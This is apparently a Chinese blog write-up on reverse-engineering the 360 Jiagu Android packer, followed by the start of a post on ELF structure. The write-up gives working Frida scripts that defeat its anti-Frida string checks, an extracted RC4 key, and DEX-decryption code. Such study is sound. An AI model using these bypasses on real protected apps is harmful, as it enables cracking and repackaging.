trace_so() 函数从现在的位置开始打印函数的调用链不就行咯：) 函数调用关系如下，我们发现再 mainELF 调用完 sub_128D44 之后，通过一系列操作又回到了壳 ELF 中，最终调用 raise 导致进程退出 然而，当我跳转到最后调用的几个函数时，可以说函数复杂到让人咋舌 这么复杂，是给人分析的吗！？所以我便卡在这里了很久 我想了想现在摆在面前的有两条路，是和一眼望不到尽头的这俩函数死磕到底，还是选择把 360 加固的反调试搞定？ 我选择后者，因为明显搞定反调试要比把这两个函数分析明白要稍微简单一点 # 加固壳反调试深入分析 在加固壳反调试初步分析中，我曾尝试过 dbus , TracerPid , readlink , strstr 都没有明显的效果，只有 hook open 函数让我看到了些许的曙光，那么现在应该还有一种非常重要的反调试手段没有用到，那就是 pthread_create 反调试 function check_pthread_create() &#123; var pthread_create_addr = Module.findExportByName(null, 'pthread_create'); var pthread_create = new NativeFunction(pthread_create_addr, \"int\", [\"pointer\", \"pointer\", \"pointer\", \"pointer\"]); Interceptor.replace(pthread_create_addr, new NativeCallback(function (parg0, parg1, parg2, parg3) &#123; var so_name = Process.findModuleByAddress(parg2).name; var so_path = Process.findModuleByAddress(parg2).path; var so_base = Module.getBaseAddress(so_name); var offset = parg2 - so_base; var PC = 0; if ((so_name.indexOf(\"jiagu\") > -1)) &#123; console.log(\"======\") console.log(\"find thread func offset\", so_name, offset.toString(16)); Thread.backtrace(this.context, Backtracer.ACCURATE).map(addr_in_so); var check_list = []//1769036,1771844 if (check_list.indexOf(offset)!==-1) &#123; console.log(\"check bypass\") &#125; else &#123; PC = pthread_create(parg0, parg1, parg2, parg3); &#125; &#125; else &#123; PC = pthread_create(parg0, parg1, parg2, parg3); &#125; return PC; &#125;, \"int\", [\"pointer\", \"pointer\", \"pointer\", \"pointer\"]))&#125;function addr_in_so(addr)&#123; var process_Obj_Module_Arr = Process.enumerateModules(); for(var i = 0; i &lt; process_Obj_Module_Arr.length; i++) &#123; if(addr>process_Obj_Module_Arr[i].base &amp;&amp; addr&lt;process_Obj_Module_Arr[i].base.add(process_Obj_Module_Arr[i].size))&#123; console.log(addr.toString(16),\"is in\",process_Obj_Module_Arr[i].name,\"offset: 0x\"+(addr-process_Obj_Module_Arr[i].base).toString(16)); &#125; &#125;&#125;注入代码之后， pthread_create 的调用都指向了同一个地址 0x17710 我们跳转到这个地址之后却发现为什么会没有 pthread_create 呢？？ 看了一眼这个代码所在的函数的名称 ffi_call_SYSV hmmm, 看来是用 libffi 动态调用函数呀 直接到 libffi 的 github 仓库看一眼 ffi_call_SYSV 的源码 一进去注释都写得清清楚楚了 利用注释就可以知道每行汇编都代表什么了，所以 BLR X24 表示去动态调用函数，而前面的 X0 , X2 , X4 , X6 是用来传参的 我们 hook 一下 x0 看看有没有什么敏感的字符串 function anti_frida_check()&#123; var module = Process.findModuleByName(\"libjiagu_64.so\"); Interceptor.attach(module.base.add(0x1770C), &#123; onEnter: function (args) &#123; try&#123; console.log(this.context.x0.readCString()) &#125; catch (e)&#123; &#125; &#125;, onLeave: function (ret) &#123; &#125; &#125;);&#125;然而神奇的是，我仅仅去 hook 并打印 x0 字符串，其他什么事情都不干，apk 竟然神奇的进去了，只不过会没有响应，感觉距离成功不远了呢 有点意思，筛选一下看看有没有什么敏感的字符串好咯 function anti_frida_check()&#123; var module = Process.findModuleByName(\"libjiagu_64.so\"); Interceptor.attach(module.base.add(0x1770C), &#123; onEnter: function (args) &#123; try&#123; var s = this.context.x0.readCString(); if (s.indexOf('frida')!==-1 || s.indexOf('gum-js-loop')!==-1 || s.indexOf('gmain')!==-1 || s.indexOf('linjector')!==-1 || s.indexOf('/proc/')!==-1)&#123; console.log(s) &#125; &#125; catch (e)&#123; &#125; &#125;, onLeave: function (ret) &#123; &#125; &#125;);&#125;竟然还真有，那就把这些字符串全部替换成无意义的字符串看看咯 function anti_frida_check()&#123; var module = Process.findModuleByName(\"libjiagu_64.so\"); Interceptor.attach(module.base.add(0x1770C), &#123; onEnter: function (args) &#123; try&#123; var s = this.context.x0.readCString(); if (s.indexOf('frida')!==-1 || s.indexOf('gum-js-loop')!==-1 || s.indexOf('gmain')!==-1 || s.indexOf('linjector')!==-1 || s.indexOf('/proc/')!==-1)&#123; console.log(s) Memory.protect(this.context.x0, Process.pointerSize, 'rwx'); var replace_str=\"\" for(var i=0;i&lt;s.length;i++)&#123; replace_str+=\"0\" &#125; this.context.x0.writeUtf8String(replace_str); &#125; &#125; catch (e)&#123; &#125; &#125;, onLeave: function (ret) &#123; &#125; &#125;);&#125;然而这样做进程却一个劲的崩溃！！ 没事，寄存器 x0 用不了，还有 x2 , x4 , x6 没替换过呢！我一个一个的试过去，终于，当我将寄存器改成 x6 时，进程终于不再崩溃成功的进入了 apk! function anti_frida_check()&#123; var module = Process.findModuleByName(\"libjiagu_64.so\"); Interceptor.attach(module.base.add(0x1770C), &#123; onEnter: function (args) &#123; try&#123; var s = this.context.x6.readCString(); if (s.indexOf('frida')!==-1 || s.indexOf('gum-js-loop')!==-1 || s.indexOf('gmain')!==-1 || s.indexOf('linjector')!==-1 || s.indexOf('/proc/')!==-1)&#123; //console.log(s) Memory.protect(this.context.x0, Process.pointerSize, 'rwx'); var replace_str=\"\" for(var i=0;i&lt;s.length;i++)&#123; replace_str+=\"0\" &#125; this.context.x0.writeUtf8String(replace_str); &#125; &#125; catch (e)&#123; &#125; &#125;, onLeave: function (ret) &#123; &#125; &#125;);&#125; 看一眼检测的字符串，怎么全是 /memfd:frida-agent-64.so # 主 DEX 加载流程分析 回到这个卡了我们很久位置，现在过了反调试之后这里的代码终于可以继续执行下去了 向下看找到这一个函数 sub_18FEA8 在这个函数中的字符串全部都是加密的，颇有种此地无银三百两的感觉，我们把字符串解密后发现了 DexFileLoader 相关的字符串，说明这个函数肯定和加载 dex 有某种关联 我们 hook 一下这个函数，发现这个函数共调用了三次，而且传入的值都是已经解密了的 dex, classes.dex , classes2.dex , classes3.dex 分别通过这个函数加载 classes.dex classes2.dex classes3.dex 把这三个 dex 给 dump 下来看看，于是我们得到了这三个文件 把最大的那个 dex 拖到 jadx 分析里面，发现这正是我们要找的主 DEX 其他函数都很正常，唯独 onCreate 函数变成了 native 声明，要是有同样分析到这里的朋友可以去研究研究 onCreate 函数对应的 native 本地函数究竟在什么地方，相信有了本文的铺垫，对于进行后续 onCreate 函数的分析应该是有所帮助的吧～ 而除此之外的别的类和直接反编译未加固的 apk 的类是一样的 # 主 DEX 解密算法分析 我们在加固壳反调试深入分析成功的绕过了 360 加固的 frida 检测，现在我们再次回到 sub_1332B8 中的 sub_128D44 , 来进行后续的解密算法的分析 下图是主 DEX 解密流程初步分析末尾部分的内容，我们将以这个函数 sub_128D44 为起点进行解密算法的分析，因为参数 v8 传入的值是加密之后的主 DEX 我们在这个内存用 frida 打一个内存读写断点来看看是究竟是什么函数读取了主 DEX, 同时需要注意加上我们的反调试函数 var so_name = \"libjiagu_64.so\";function hook_dex_dec_enter_in_main_elf()&#123; var module = Process.findModuleByName(\"libjiagu_64.so\"); Interceptor.attach(module.base.add(0x1346B4), &#123; onEnter: function (args) &#123; //memory breakpoint MemoryAccessMonitor.enable( &#123; base:this.context.x0.add(0x8), size:40 &#125;,&#123; onAccess: function (details) &#123; console.log(details.operation) console.log(get_addr_in_so(details.from)); &#125; &#125; ) &#125;, onLeave: function (ret) &#123; &#125; &#125;);&#125;var zlib_count=0function hook_zlib()&#123; Interceptor.attach(Module.findExportByName(null, \"inflate\"), &#123; // fd, buff, len onEnter: function (args) &#123; zlib_count+=1 if(zlib_count===2)&#123; hook_dex_dec_enter_in_main_elf(); &#125; &#125;, onLeave: function (ret) &#123; &#125; &#125;);&#125;function anti_frida_check()&#123; var module = Process.findModuleByName(\"libjiagu_64.so\"); Interceptor.attach(module.base.add(0x1770C), &#123; onEnter: function (args) &#123; try&#123; var s = this.context.x6.readCString(); if (s.indexOf('frida')!==-1 || s.indexOf('gum-js-loop')!==-1 || s.indexOf('gmain')!==-1 || s.indexOf('linjector')!==-1 || s.indexOf('/proc/')!==-1)&#123; //console.log(s) Memory.protect(this.context.x0, Process.pointerSize, 'rwx'); var replace_str=\"\" for(var i=0;i&lt;s.length;i++)&#123; replace_str+=\"0\" &#125; this.context.x0.writeUtf8String(replace_str); &#125; &#125; catch (e)&#123; &#125; &#125;, onLeave: function (ret) &#123; &#125; &#125;);&#125;function get_addr_in_so(addr)&#123; var process_Obj_Module_Arr = Process.enumerateModules(); for(var i = 0; i &lt; process_Obj_Module_Arr.length; i++) &#123; if(addr>process_Obj_Module_Arr[i].base &amp;&amp; addr&lt;process_Obj_Module_Arr[i].base.add(process_Obj_Module_Arr[i].size))&#123; return addr.toString(16)+\" is in \"+process_Obj_Module_Arr[i].name+\" offset: 0x\"+(addr-process_Obj_Module_Arr[i].base).toString(16); &#125; &#125; return addr.toString(16);&#125;function hook_dlopen() &#123; //hook_call_constructors(); Interceptor.attach(Module.findExportByName(null, \"android_dlopen_ext\"), &#123; onEnter: function (args) &#123; var pathptr = args[0]; if (pathptr !== undefined &amp;&amp; pathptr != null) &#123; var path = ptr(pathptr).readCString(); console.log(\"dlopen \"+path); if (path.indexOf(so_name) >= 0) &#123; this.is_can_hook = true; &#125; &#125; &#125;, onLeave: function (retval) &#123; if (this.is_can_hook) &#123; //you can do any thing before stalker trace so //trace_so(); hook_zlib(); anti_frida_check(); //hook_C918(); &#125; &#125; &#125; );&#125;setImmediate(hook_dlopen);打印日志如下 说明是在 0xd364 处读取了这个主 DEX 跳转到 0xd364 之后发现这个地址在函数 sub_C918 中，看起来这个函数的形状像一个火车头一样 XD 接下来我们继续使用 staker_trace_so 生成的 trace_so() 函数去看看函数的调用链是什么样子的，trace 的起点就是在 sub_1332B8 中的 sub_128D44 , 同时注意加上我们的反调试函数 打印出来的函数调用链如下 start Stalker!Stalker end!(mainELF)call1:sub_128D44(mainELF)call2:j_interpreter_wrap_int64_t(mainELF)call3:interpreter_wrap_int64_t(KEkeELF)call4:interpreter_wrap_int64_t_bridge(KEkeELF)call5:getenv(KEkeELF)call6:sub_13908(KEkeELF)call7:inotify_add_watch(KEkeELF)call8:sub_11220(KEkeELF)call9:fopen(KEkeELF)call10:sub_9DD8(KEkeELF)call11:sub_E3E0(KEkeELF)call12:strtol(KEkeELF)call13:feof(KEkeELF)call14:raise(KEkeELF)call15:memset(KEkeELF)call16:sub_C918// 这个函数中读取加密之后的 dex(KEkeELF)call17:sub_9964(KEkeELF)call18:sub_9AC4(KEkeELF)call19:sub_9988(KEkeELF)call20:j_ffi_prep_cif(KEkeELF)call21:ffi_prep_cif(KEkeELF)call22:j_ffi_prep_cif_machdep(KEkeELF)call23:ffi_prep_cif_machdep(KEkeELF)call24:j_ffi_call(KEkeELF)call25:ffi_call(KEkeELF)call26:sub_1674C(KEkeELF)call27:j_ffi_call_SYSV(KEkeELF)call28:ffi_call_SYSV(KEkeELF)call29:sub_167BC(KEkeELF)call30:sub_1647C(KEkeELF)call31:sub_163DC(mainELF)call32:_Znwm(mainELF)call33:malloc(mainELF)call34:sub_128D64(KEkeELF)call35:sub_9E58(KEkeELF)call36:j_lseek_1(KEkeELF)call37:lseek(KEkeELF)call38:sub_A3EC(KEkeELF)call39:sub_99CC(KEkeELF)call40:sub_9944(KEkeELF)call41:sub_999C(mainELF)call42:sub_128D70(mainELF)call43:memcpy(mainELF)call44:sub_14283C(mainELF)call45:j__Znwm(mainELF)call46:sub_1429CC(mainELF)call47:sub_142FE0(KEkeELF)call48:sub_10964(KEkeELF)call49:sub_9D60(mainELF)call50:sub_143008(mainELF)call51:sub_142ABC(mainELF)call52:sub_142EA0(mainELF)call53:sub_143A38(mainELF)call54:sub_11CF8C(mainELF)call55:sub_12047C(mainELF)call56:strlen(mainELF)call57:memcmp(mainELF)call58:sub_117B68(KEkeELF)call59:sub_166C4(KEkeELF)call60:memcpy(mainELF)call61:sub_143848(mainELF)call62:sub_1B66A8(mainELF)call63:pthread_mutex_lock(mainELF)call64:sub_143B48(mainELF)call65:sub_1B66D0(mainELF)call66:pthread_mutex_unlock(mainELF)call67:sub_143088(mainELF)call68:sub_11F768(mainELF)call69:j__ZdlPv(mainELF)call70:_ZdlPv(mainELF)call71:free(mainELF)call72:sub_1178E8(mainELF)call73:sub_1222D0(mainELF)call74:sub_14316C(mainELF)call75:sub_142954(KEkeELF)call76:_Z9__arm_a_2PcmS_Rii(KEkeELF)call77:j_interpreter_wrap_int64_t(KEkeELF)call78:interpreter_wrap_int64_t(KEkeELF)call79:sub_9FFC(KEkeELF)call80:j_lseek_3(KEkeELF)call81:j_lseek_2(KEkeELF)call82:sub_9A90(mainELF)call83:sub_142894(mainELF)call84:sub_1428BC(mainELF)call85:sub_127DCC(mainELF)call86:sub_14292C(mainELF)call87:sub_14285C(KEkeELF)call88:j_lseek_0(mainELF)call89:_Znam(mainELF)call90:sub_128E88(mainELF)call91:_ZdaPv(mainELF)call92:sub_142AA4(mainELF)call93:sub_142A10(mainELF)call94:sub_12036C(mainELF)call95:sub_1B6680(mainELF)call96:pthread_mutex_destroy(mainELF)call97:sub_131D58(mainELF)call98:sub_11F3A4(mainELF)call99:sub_18FEA8// 这个函数中传入解密之后的 dex, 位置如下图所示 追踪函数调用链，我们发现了两个有趣的函数 (mainELF)call50:sub_143008(mainELF)call51:sub_142ABCsub_143008 看起来是一个解密的函数，先加上 0x70 再异或 0x36, 我们 hook 一下传入的参数看看是什么情况 我们再去看看加密的 dex, 发现这个函数传入的就是加密的主 dex 把这部分解密看看里面是什么内容 with open('ke_classes.dex', 'rb') as f: s = f.read()dexA = s[0x31A4:0x31A4 + 0x41E]dexA = bytearray(dexA)for i in range(len(dexA)): dexA[i] = ((dexA[i] + 0x70) ^ 0x36)&amp;0xffwith open('dexA.dex','wb') as f: f.write(dexA)简单看了看， APPKEY , activityName 等等像是一些配置信息的样子 这部分内容解密完之后，在 sub_142ABC 中以 pk 为标志读取各个配置信息 之后我继续一个一个跳转到打印出来的函数中看，却一直都没有发现后续部分的解密算法的身影，随后我又仔细的看了一下调用的函数，突然有了惊喜的发现，这里的 pthread_mutex_lock 不就意味着要用互斥锁来切换到另外一个线程了吗！？ (mainELF)call61:sub_143848(mainELF)call62:sub_1B66A8(mainELF)call63:pthread_mutex_lock(mainELF)call64:sub_143B48(mainELF)call65:sub_1B66D0(mainELF)call66:pthread_mutex_unlock我们 hook 一下 sub_143848 , 并同时打印出 pid 来看看是什么情况 果不其然，在这里我们发现除了主线程外，还有三个不同的线程调用了这个函数 那我们在 pid 和主线程不同的时候，用 stalker_trace_so 的 trace_so 函数在去看看究竟调用了什么函数吧 var stalker_trace_once = false;function hook_thread()&#123; var module = Process.findModuleByName(\"libjiagu_64.so\"); Interceptor.attach(module.base.add(0x143848), &#123; onEnter: function (args) &#123; if(main_thread!==Process.getCurrentThreadId())&#123; if(!stalker_trace_once)&#123; stalker_trace_once = true; trace_so(); &#125; &#125; &#125;, onLeave: function (ret) &#123; &#125; &#125;);&#125;打印出的内容如下 main thread 9434start Stalker!, pid: 9472Stalker end! (mainELF)call1:sub_1B66A8(mainELF)call2:pthread_mutex_lock(mainELF)call3:sub_143B48(mainELF)call4:memcmp(mainELF)call5:sub_142EA0(mainELF)call6:sub_143A38(mainELF)call7:sub_1B66D0(mainELF)call8:pthread_mutex_unlock(KEkeELF)call9:memset(KEkeELF)call10:inotify_add_watch(KEkeELF)call11:sub_9AC4(KEkeELF)call12:j_ffi_prep_cif(KEkeELF)call13:ffi_prep_cif(KEkeELF)call14:j_ffi_prep_cif_machdep(KEkeELF)call15:ffi_prep_cif_machdep(KEkeELF)call16:j_ffi_call(KEkeELF)call17:ffi_call(KEkeELF)call18:fopen(KEkeELF)call19:sub_1674C(KEkeELF)call20:j_ffi_call_SYSV(KEkeELF)call21:ffi_call_SYSV(KEkeELF)call22:sub_167BC(KEkeELF)call23:sub_1647C(KEkeELF)call24:sub_163DC(mainELF)call25:sub_1178E8(KEkeELF)call26:sub_9988(mainELF)call27:sub_1236B8(mainELF)call28:strlen(mainELF)call29:sub_1222D0(mainELF)call30:sub_128D70(mainELF)call31:memcpy(KEkeELF)call32:getenv(KEkeELF)call33:sub_9E58(KEkeELF)call34:j_lseek_1(KEkeELF)call35:lseek(mainELF)call36:sub_1A1AE8(mainELF)call37:j_strcmp(mainELF)call38:strcmp(mainELF)call39:sub_19F7C4(mainELF)call40:j__Znwm(mainELF)call41:_Znwm(mainELF)call42:malloc(mainELF)call43:sub_1A1B64(KEkeELF)call44:sub_9964(mainELF)call45:sub_1A1B7C(mainELF)call46:memset(mainELF)call47:sub_1A1D84(mainELF)call48:sub_1A1E74(mainELF)call49:j_j__ZdlPv_12(mainELF)call50:j__ZdlPv(mainELF)call51:_ZdlPv(mainELF)call52:free(mainELF)call53:sub_18DC28(mainELF)call54:sub_18DC4C(KEkeELF)call55:sub_9FFC(mainELF)call56:sub_19B7EC(mainELF)call57:mmap(KEkeELF)call58:sub_A3EC(KEkeELF)call59:sub_9944(mainELF)call60:sub_18DCC0(mainELF)call61:sub_18F6AC(mainELF)call62:sub_18DDA8(mainELF)call63:sub_18DD94(mainELF)call64:sub_18DDB8(mainELF)call65:sub_18E8D0(mainELF)call66:sub_18E244(mainELF)call67:j_j__ZdlPv_5(mainELF)call68:sub_129468(mainELF)call69:sub_12D478(mainELF)call70:sub_1A19EC(KEkeELF)call71:raise(KEkeELF)call72:j_lseek_2(KEkeELF)call73:sub_9A90(KEkeELF)call74:j_lseek_0(KEkeELF)call75:j_lseek_3(mainELF)call76:sub_19BC9C(mainELF)call77:sub_11CF8C(mainELF)call78:sub_131D58(mainELF)call79:memmove继续跟着调用的函数一处一处到 ida 里面看，在下面的函数中我们终于有了收获 (mainELF)call45:sub_1A1B7C(mainELF)call46:memset(mainELF)call47:sub_1A1D84(mainELF)call48:sub_1A1E74这个算法，看起来又是 RC4 呐 hook 一下这个函数，发现密钥是 b&quot;\\x68\\x76\\x99\\x72\\x96\\x60\\x9f\\x63\\x96\\x2c\\x98\\x30\\xc2\\x36\\x51\\x42&quot; 再去 hook sub_1A1E74 看看传入了什么数据，我们发现前三部分都是 f7 4f e8 0e 开头的 看到这些数据，终于离成功又更进一步了，因为这些数据就是我们读取完壳 DEX 尾部的前 0x41E 个加密数据并解密出配置信息之后的那部分加密数据，同时我们也可以在 010editor 中通过搜索壳 DEX 找到它们，这三部分加密数据段所在的位置分别为 0x35CE , 0x3A93AD , 0x417064 我们先来到第一个数据段的位置来分析数据段的结构，这个位置是在 0x31A4+0x41E , 即 0x35c2 之后 所以这 dex 的第一个解密算法如下 def RC4(data, key): S = list(range(256)) j = 0 out = [] # KSA Phase for i in range(256): j = (j + S[i] + key[i % len(key)]) % 256 S[i], S[j] = S[j], S[i] # PRGA Phase i = j = 0 count = 1 for ch in data: i = (i + 1) % 256 j = (j + S[i]) % 256 S[i], S[j] = S[j], S[i] out.append(ch ^ S[(S[i] + S[j]) % 256]) return outdef RC4decrypt(ciphertext, key): return RC4(ciphertext, key)key = b\"\\x68\\x76\\x99\\x72\\x96\\x60\\x9f\\x63\\x96\\x2c\\x98\\x30\\xc2\\x36\\x51\\x42\"with open('com.oacia.apk_protect/classes.dex', 'rb') as f: enc_data = f.read()start = 0x35C2dexcount = int.from_bytes(enc_data[start:start+4],'little')start+=4for i in range(dexcount): total_data_len = int.from_bytes(enc_data[start:start+4],'little') start+=4 rc4_data_len = int.from_bytes(enc_data[start:start+4],'little') start+=4 enc_dex = enc_data[start:start+rc4_data_len] start+=rc4_data_len dec_dex = RC4decrypt(enc_dex,key) dec2_data_len = int.from_bytes(dec_dex[9:13],'little') with open(f'dex&#123;i+1&#125;.dex','wb') as f: f.write(bytes(dec_dex)) extra = enc_data[start:start+total_data_len-rc4_data_len] extra_data_base = int.from_bytes(dec_dex[5:9], 'little') extra_data_len = len(extra) start+=total_data_len-rc4_data_len-4 print(f\"part&#123;i + 1&#125;: total_data_len: &#123;hex(total_data_len)&#125;, rc4_data_len: &#123;hex(rc4_data_len)&#125;\") print(f\"rc4_dec_part&#123;i + 1&#125;: extra_data_base: &#123;hex(extra_data_base)&#125;,extra_data_len: &#123;hex(extra_data_len)&#125;, dec2_data_len: &#123;hex(dec2_data_len)&#125;\") with open(f'dex&#123;i+1&#125;_extra.dex','wb') as f: f.write(bytes(extra)) 但是光这还不够，因为 rc4 解密出来的数据仍然不是 DEX 格式 之后继续跟着函数调用链走，找到这些函数 (mainELF)call60:sub_18DCC0(mainELF)call61:sub_18F6AC(mainELF)call62:sub_18DDA8(mainELF)call63:sub_18DD94(mainELF)call64:sub_18DDB8在 sub_18F6AC 中的代码感觉很像是算法相关 通过 hook 其中的 sub_18DDB8 函数发现 a3 是 rc4 解密之后的从 0xc 开始的数据段 而前面的 0xc 位额外数据的读取方式为 5+4+4, 在 sub_18DCC0 中有读取操作，通过这样的读取操作我们可以依次得到 0x010000005D , 0x400000 , 0x109492 这里的 0x109492 表示的是第二次解密的数据段的大小，那么 0x40000 表示什么呢？ 还记得我们的加密数据段是有前后两部分的嘛，前半部分用 rc4 解密，那么后半部分我们来看看长什么样子好了 后半部分的数据看起来十分的规整，不像是有加密的样子 而在主 DEX 加载流程分析中，我们成功的 dump 出了主 DEX, 那么我们不妨把这个这里的数据到主 DEX 中搜索一番看看有什么发现吧 在主 DEX 中搜索第一行的字节，我们惊喜的发现竟然可以搜索到，并且它的位置正好就是 0x400000 ! 所以说经过 RC4 解密之后的这部分的数据结构我们也就可以知道了 接下来我们只要搞清楚在 sub_18DDB8 中第二次解密的算法是什么就可以了 我们再回到分析的起点 sub_128D44 函数，来看看能不能有其他的发现 通过 hook sub_128D44 的返回值 v150 之后发现，三级指针指向着解密之后的 dex console.log(hexdump(ptr(ptr(ptr(this.context.x0.readS64()).add(0x0).readS64()).readS64()), &#123; offset: 0,// 相对偏移 length: 0x40,//dump 的大小 header: true, ansi: true&#125;)); 而倘若我们观察这个解密数据所在的内存 703bc75000 , 它正好是 0x1000 的倍数，而 0x1000 正好就是一页的大小 这意味着什么呢？ 这说明 dex 所在的内存极有可能是通过 mmap 函数分配的！ 而在 stalker_trace_so 打印的数据中，正好就有这个函数被调用了 (mainELF)call57:mmap于是我们来到 mmap 被调用的函数 使用 frida hook mmap 返回的内存指针，然后打上内存读写断点，就可以帮助我们快速定位到最终解密算法完成之后赋值的地址 function hook_mmap()&#123; var module = Process.findModuleByName(\"libjiagu_64.so\"); Interceptor.attach(module.base.add(0x19B81C), &#123; // fd, buff, len onEnter: function (args) &#123; console.log(\"mmap!\") console.log(this.context.x0); MemoryAccessMonitor.enable( &#123; base:this.context.x0, size:30 &#125;,&#123; onAccess: function (details) &#123; console.log(details.operation) console.log(get_addr_in_so(details.from)); &#125; &#125; ) &#125;, onLeave: function (ret) &#123; &#125; &#125;);&#125;function get_addr_in_so(addr)&#123; var process_Obj_Module_Arr = Process.enumerateModules(); for(var i = 0; i &lt; process_Obj_Module_Arr.length; i++) &#123; if(addr>process_Obj_Module_Arr[i].base &amp;&amp; addr&lt;process_Obj_Module_Arr[i].base.add(process_Obj_Module_Arr[i].size))&#123; return addr.toString(16)+\" is in \"+process_Obj_Module_Arr[i].name+\" offset: 0x\"+(addr-process_Obj_Module_Arr[i].base).toString(16); &#125; &#125; return addr.toString(16);&#125;在 0x18ebd4 中将值写入最终的目标内存，这个地址在 sub_18E8D0 中 在这个函数的开头，有对参数 a1 的读取操作 我们 hook 一下值来看看 a1 各个部分都有什么含义 给 a1 写一个结构体好了 struct dec2_struct&#123; long long shift_bit;// 移位的位数 int reversed0; int reversed1; long long constA; long long dest;// 解密后的 dex 存储的地址 long long constB; long long constC; long long index; long long extra_dex_base;// 额外数据将要复制到的基址 int guess_count2; int reversed2; int flag; int key[4]; int reversed3; int reversed4; int reversed5; int data_len;// 记录额外数据的长度 int input_read_index;// 记录读取输入的加密数据的下标 unsigned char data[0x112];// 记录额外数据&#125;最后带着我们的结构体逛逛这个解密算法的函数好咯 sub_18F6AC sub_18DDB8 sub_18E244 sub_18E8D0 这些函数无壳无花无打乱，也没有 vmp 加固，显得相当的干净，看起来是一个自定义算法 算法千变万化，但是加固永远不是重在算法 逆向一款优秀的加固壳，从中学习到的知识可以受益终生，同时也可以借此思考如何避免让别人轻易找到加固方案的突破口 逢山开路，遇水搭桥。兵来将挡，水来土掩。 我们最后来 hook 一下下面这个地方来为我们的分析画上圆满的句号吧 至此，360 加固分析完毕 # 总结 360 加固和常规的加固方案类似，都是 壳DEX-&gt;壳ELF-&gt;主ELF-&gt;主DEX 这样的过程，其中壳 ELF 解密主 ELF 所用到的算法是 RC4 和 uncompress , 壳 ELF 加载主 ELF 所用到的技术是自实现 linker 加固 so 当然 360 加固还有许多值得继续研究分析的地方，例如分发 so 函数的 vmp 其内部逻辑究竟是什么样子呢？native 化的 onCreate 函数，dex2c 的原理究竟是什么呢？这些就留给未来的不眠之夜吧～ 月遇从云，花遇和风，今晚上的夜空很美 # 参考资料 360 加固保关键技术浅析 Decrypting strings with a JEB script 自实现 linker 加固 so 360 加固保分析 误入虎穴，喜得虎子 —— 记一次手游加固的脱壳与修复","categories":[],"tags":[]},{"title":"ELF结构分析及ElfReader","slug":"ElfReader","date":"2024-02-17T06:11:23.000Z","updated":"2025-04-08T18:55:11.409Z","comments":true,"path":"ElfReader/","link":"","permalink":"https://oacia.dev/ElfReader/","excerpt":"","text":"在 Android 中使用 System.load 加载一个 so 时，是通过 ElfReader 去解析这个 so 的重要结构及属性的，本文将对 ELF 的结构，链接过程，装载过程进行分析，并研究 ELF 在 AOSP 中的解析过程 # ELF 结构简析 ELF 文件主要分为 3 个部分: ELF Header 描述整个文件的组织 Program Header Table 包含了运行时加载程序所需要的信息 Section Header Table 包含了链接时所需要用到的信息 # ELF Header //https://github.com/bminor/glibc/blob/glibc-2.27/elf/elf.h#define EI_NIDENT (16)typedef struct&#123; unsigned char e_ident[EI_NIDENT]; /* Magic number and other info */ Elf32_Half e_type; /* Object file type */ Elf32_Half e_machine; /* Architecture */ Elf32_Word e_version; /* Object file version */ Elf32_Addr e_entry; /* Entry point virtual address */ Elf32_Off e_phoff; /* Program header table file offset */ Elf32_Off e_shoff; /* Section header table file offset */ Elf32_Word e_flags; /* Processor-specific flags */ Elf32_Half e_ehsize; /* ELF header size in bytes */ Elf32_Half e_phentsize; /* Program header table entry size */ Elf32_Half e_phnum; /* Program header table entry count */ Elf32_Half e_shentsize; /* Section header table entry size */ Elf32_Half e_shnum; /* Section header table entry count */ Elf32_Half e_shstrndx; /* Section header string table index */&#125; Elf32_Ehdr;# e_ident[EI_NIDENT] 该变量给出了用于解码和解释文件中与机器无关的数据的方式。这个数组对于不同的下标的含义如下 宏名称 下标 目的 EI_MAG0 0 文件标识 EI_MAG1 1 文件标识 EI_MAG2 2 文件标识 EI_MAG3 3 文件标识 EI_CLASS 4 文件类 EI_DATA 5 数据编码 EI_VERSION 6 文件版本 EI_PAD 7 补齐字节开始处 # e_ident[EI_MAG0…EI_MAG3] 这是 ELF 文件的头 4 个字节，被称作 “魔数”，标识该文件是一个 ELF 目标文件。 名称 值 位置 ELFMAG0 0x7f e_ident[EI_MAG0] ELFMAG1 ‘E’ e_ident[EI_MAG1] ELFMAG2 ‘L’ e_ident[EI_MAG2] ELFMAG3 ‘F’ e_ident[EI_MAG3] # e_ident[EI_CLASS] 标识文件的类型或容量 名称 值 意义 ELFCLASSNONE 0 无效类型 ELFCLASS32 1 32 位文件 ELFCLASS64 2 64 位文件 # e_ident[EI_DATA] 给出目标文件中的特定处理器数据的编码方式 名称 值 意义 ELFDATANONE 0 无效数据编码 ELFDATA2LSB 1 小端 ELFDATA2MSB 2 大端 # e_type e_type 标识目标文件类型。 名称 值 意义 ET_NONE 0 无文件类型 ET_REL 1 可重定位文件 ET_EXEC 2 可执行文件 ET_DYN 3 共享目标文件 ET_CORE 4 核心转储文件 ET_LOPROC 0xff00 处理器指定下限 ET_HIPROC 0xffff 处理器指定上限 # e_machine 这一项指定了当前文件可以运行的机器架构，EM 是 ELF Machine 的简写 名称 值 意义 EM_NONE 0 无机器类型 EM_M32 1 AT&amp;T WE 32100 EM_SPARC 2 SPARC EM_386 3 Intel 80386 EM_68K 4 Motorola 68000 EM_88K 5 Motorola 88000 EM_860 7 Intel 80860 EM_MIPS 8 MIPS RS3000 # e_version 标识目标文件的版本。 名称 值 意义 EV_NONE 0 无效版本 EV_CURRENT 1 当前版本 # e_entry 这一项为系统转交控制权给 ELF 中相应代码的虚拟地址。如果没有相关的入口项，则这一项为 0。 例如当 e_entry 为 00 00 80 00 时，得到可执行程序的入口地址为 0x8000 它是程序的入口虚拟地址，注意不是 main 函数的地址，而是 .text 段的首地址 _start 。当然这也要求程序本身非 PIE ( -no-pie ) 编译的且 ASLR 关闭的情况下，对于非 ET_EXEC 类型通常并不是实际的虚拟地址值. # e_phoff 这一项给出程序头部表在文件中的字节偏移（Program Header table OFFset）。如果文件中没有程序头部表，则为 0。 # e_shoff 这一项给出节头表在文件中的字节偏移（ Section Header table OFFset ）。如果文件中没有节头表，则为 0。 # e_flags 这一项给出文件中与特定处理器相关的标志，这些标志命名格式为 EF_machine_flag 。 # e_ehsize 这一项给出 ELF 文件头部的字节长度（ELF Header Size）。 # e_phentsize 这一项给出程序头部表中每个表项的字节长度（Program Header ENTry SIZE）。每个表项的大小相同。 # e_phnum 这一项给出程序头部表的项数（ Program Header entry NUMber ）。因此， e_phnum 与 e_phentsize 的乘积即为程序头部表的字节长度。如果文件中没有程序头部表，则该项值为 0。 # e_shentsize 这一项给出节头的字节长度（Section Header ENTry SIZE）。一个节头是节头表中的一项；节头表中所有项占据的空间大小相同。 # e_shnum 这一项给出节头表中的项数（Section Header 